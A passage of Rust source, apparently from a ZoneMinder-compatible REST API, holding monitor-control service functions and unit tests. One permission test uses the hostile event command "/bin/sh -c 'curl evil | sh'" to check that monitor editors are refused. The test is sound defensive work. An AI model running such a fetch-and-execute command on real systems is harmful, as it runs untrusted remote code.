    ensure_visible(scope, id, Level::Edit)?;
    let monitor = repo::monitors::find_by_id(state.db(), id)
        .await?
        .ok_or_else(|| {
            AppError::NotFoundError(Resource {
                details: vec![("id".to_string(), id.to_string())],
                resource_type: ResourceType::File,
            })
        })?;
    // Its daemons first, while the row still exists: a zmc whose monitor row
    // vanished crash-looped forever (#76). Reconcile also catches this.
    crate::service::monitor_daemons::deleting(state, &monitor).await;
    repo::monitors::delete(state.db(), monitor).await
}

pub async fn update_state(
    state: &AppState,
    id: u32,
    req: MonitorStateRequest,
    scope: &MonitorScope,
) -> AppResult<MonitorResponse> {
    info!("Updating state of monitor with ID: {id} and request: {req:?}.");
    ensure_visible(scope, id, Level::Edit)?;

    // Use repository to fetch the monitor
    let monitor_model = repo::monitors::find_by_id(state.db(), id)
        .await?
        .ok_or_else(|| {
            AppError::NotFoundError(Resource {
                details: vec![("id".to_string(), id.to_string())],
                resource_type: ResourceType::Monitor,
            })
        })?;

    // Validate the action
    let action = req.state.as_str();
    match action {
        "start" | "stop" | "restart" => {}
        _ => {
            return Err(AppError::BadRequestError(format!(
                "Invalid state: {}",
                req.state
            )));
        }
    }

    // Control the daemons: zm-api's own in takeover, zmdc.pl's in passive.
    let action = match action {
        "start" => crate::service::monitor_daemons::Action::Start,
        "stop" => crate::service::monitor_daemons::Action::Stop,
        _ => crate::service::monitor_daemons::Action::Restart,
    };
    crate::service::monitor_daemons::set_state(state, &monitor_model, action).await;

    // Return the current monitor state
    Ok(MonitorResponse::from(monitor_model))
}

/// The live audio level from zmc's shared memory, renewing the request that
/// keeps zmc measuring it for another ten seconds even with AudioDetection
/// off, as ZoneMinder's monitor editor does on each poll (#180).
pub async fn audio_level(
    state: &AppState,
    id: u32,
    scope: &MonitorScope,
) -> AppResult<crate::dto::response::monitor_status::AudioLevelResponse> {
    ensure_visible(scope, id, Level::View)?;
    let monitor = repo::monitors::find_by_id(state.db(), id)
        .await?
        .ok_or_else(|| monitor_not_found(id))?;
    let until = (chrono::Utc::now().timestamp() + 10) as u32;
    let live = tokio::task::spawn_blocking(move || {
        crate::zm_shm::MonitorShm::connect(id).ok().map(|mut shm| {
            let _ = shm.request_audio_level(until);
            (shm.get_audio_level(), shm.get_audio_alarm())
        })
    })
    .await
    .ok()
    .flatten();
    Ok(crate::dto::response::monitor_status::AudioLevelResponse {
        level: live.map(|(l, _)| l),
        alarm: live.map(|(_, a)| a),
        threshold: monitor.audio_threshold,
        detection: monitor.audio_detection != 0,
    })
}

pub async fn control_alarm(
    state: &AppState,
    id: u32,
    req: AlarmControlRequest,
    scope: &MonitorScope,
) -> AppResult<MonitorResponse> {
    use crate::zm_shm::{self, MonitorShm};

    info!("Controlling alarm of monitor with ID: {id} and request: {req:?}.");
    ensure_visible(scope, id, Level::Edit)?;

    // Use repository to fetch the monitor (validates it exists)
    let monitor_model = repo::monitors::find_by_id(state.db(), id)
        .await?
        .ok_or_else(|| {
            AppError::NotFoundError(Resource {
                details: vec![("id".to_string(), id.to_string())],
                resource_type: ResourceType::Monitor,
            })
        })?;

    // Handle the alarm action via shared memory
    match req.action.as_str() {
        "on" => {
            // Trigger alarm via shared memory
            let score = req.score.unwrap_or(100);
            let cause = req.cause.as_deref().unwrap_or("API");
            let text = req.text.as_deref().unwrap_or("Triggered via REST API");

            // The shared-memory mmap/poke is blocking; run it off the async
            // executor so it can't stall the runtime. REVIEW_FIXES_PLAN §4.3.
            let cause_owned = cause.to_string();
            let text_owned = text.to_string();
            tokio::task::spawn_blocking(move || {
                zm_shm::trigger_alarm(id, score, &cause_owned, &text_owned)
            })
            .await
            .map_err(|e| {
                AppError::ServiceUnavailableError(format!(
                    "Alarm task failed for monitor {id}: {e}"
                ))
            })?
            .map_err(|e| {
                AppError::ServiceUnavailableError(format!(
                    "Failed to trigger alarm for monitor {}: {}",
                    id, e
                ))
            })?;

            info!(
                "Triggered alarm on monitor {}: score={}, cause={}",
                id, score, cause
            );
        }
        "off" | "cancel" => {
            // Cancel alarm via shared memory
            // Blocking shared-memory write — run off the async executor.
            // REVIEW_FIXES_PLAN §4.3.
            tokio::task::spawn_blocking(move || zm_shm::cancel_alarm(id))
                .await
                .map_err(|e| {
                    AppError::ServiceUnavailableError(format!(
                        "Alarm task failed for monitor {id}: {e}"
                    ))
                })?
                .map_err(|e| {
                    AppError::ServiceUnavailableError(format!(
                        "Failed to cancel alarm for monitor {}: {}",
                        id, e
                    ))
                })?;

            info!("Cancelled alarm on monitor {}", id);
        }
        // ZoneMinder's Disable/Enable Alarms (`zmu -n` / `zmu -c`, #139):
        // TRIGGER_OFF holds alarms off until a cancel returns to normal.
        "disable_alarms" | "enable_alarms" => {
            let disable = req.action == "disable_alarms";
            tokio::task::spawn_blocking(move || -> zm_shm::Result<()> {
                let mut shm = MonitorShm::connect(id)?;
                if disable {
                    shm.disable_triggers()
                } else {
                    shm.cancel_alarm()
                }
            })
            .await
            .map_err(|e| {
                AppError::ServiceUnavailableError(format!(
                    "Alarm task failed for monitor {id}: {e}"
                ))
            })?
            .map_err(|e| {
                AppError::ServiceUnavailableError(format!(
                    "Failed to {} alarms for monitor {id}: {e}",
                    if disable { "disable" } else { "enable" }
                ))
            })?;
            info!(
                "{} alarms on monitor {id}",
                if disable { "Disabled" } else { "Enabled" }
            );
        }
        "status" => {
            // Get current alarm status from shared memory
            match MonitorShm::connect(id) {
                Ok(shm) => {
                    let state = shm.get_state();
                    let trigger_state = shm.get_trigger_state();
                    info!(
                        "Monitor {} alarm status: state={}, trigger={:?}",
                        id, state, trigger_state
                    );
                }
                Err(e) => {
                    tracing::warn!("Could not read alarm status for monitor {}: {}", id, e);
                }
            }
        }
        _ => {
            return Err(AppError::BadRequestError(format!(
                "Invalid alarm action: {}. Valid actions: on, off, cancel, status, \
                 disable_alarms, enable_alarms",
                req.action
            )));
        }
    }

    // Return the current monitor state from DB
    Ok(MonitorResponse::from(monitor_model))
}

#[cfg(test)]
mod event_command_tests {
    use super::*;
    use crate::util::authz::UserPermissions;

    fn monitors_editor() -> UserPermissions {
        UserPermissions {
            monitors: Level::Edit,
            system: Level::View,
            ..Default::default()
        }
    }

    #[test]
    fn a_monitors_editor_cannot_set_an_event_command() {
        let err = ensure_may_set_event_commands(
            &monitors_editor(),
            [Some("/bin/sh -c 'curl evil | sh' %EID%"), None],
            ["", ""],
        )
        .expect_err("must be refused");
        assert!(matches!(err, AppError::PermissionDeniedError(_)));
        assert!(ensure_may_set_event_commands(
            &monitors_editor(),
            [None, Some("")],
            ["", "/usr/local/bin/notify"],
        )
        .is_err());
    }

    #[test]
    fn resending_the_current_commands_is_not_a_change() {
        assert!(ensure_may_set_event_commands(
            &monitors_editor(),
            [Some("/usr/local/bin/notify"), None],
            ["/usr/local/bin/notify", ""],
        )
        .is_ok());
    }

    #[test]
    fn a_system_editor_may_set_event_commands() {
        let admin = UserPermissions {
            system: Level::Edit,
            ..Default::default()
        };
        assert!(ensure_may_set_event_commands(&admin, [Some("x"), Some("y")], ["", ""]).is_ok());
    }
}

#[cfg(test)]
mod linked_monitor_tests {
    use super::linked_monitor_ids;

    #[test]
    fn linked_monitor_ids_follow_zmcs_grammar() {
        assert_eq!(linked_monitor_ids(""), Ok(vec![]));
        assert_eq!(linked_monitor_ids("3"), Ok(vec![3]));
        assert_eq!(linked_monitor_ids("1,2"), Ok(vec![1, 2]));
        assert_eq!(linked_monitor_ids("(1:4|2) & 3"), Ok(vec![1, 2, 3]));
        for bad in [
            "abc",
            "1;2",
            "1:x",
            "1::2",
            ":3",
            "-1",
            "99999999999",
            "1 2",
            "1:",
        ] {
            assert!(linked_monitor_ids(bad).is_err(), "{bad}");
        }
    }
}
